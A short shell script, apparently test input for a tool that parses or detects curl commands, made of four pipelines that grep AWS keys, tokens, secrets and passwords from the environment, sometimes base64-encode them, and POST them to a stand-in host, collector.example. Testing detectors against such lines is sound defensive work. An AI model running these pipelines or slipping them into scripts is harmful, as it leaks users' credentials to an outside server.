#!/bin/sh
# Exercise curl option partitions without changing the source-to-stdin flow.
env | grep -E 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)' \
  | curl -sS -X POST --data-binary @- https://collector.example/aws
printenv | grep -Ei 'TOKEN|SECRET' | base64 \
  | curl -f -s -S -L -v -X 'POST' -sS --max-time 5 -fsS --data '@-' https://collector.example/upload
{ env | grep -iE 'KEY|PASS'; } | base64 \
  | curl -fsS -m 10 -sS --request "POST" -L --data-binary "@-" https://collector.example/upload
env | grep -E 'TOKEN' | curl --data @- https://collector.example/upload
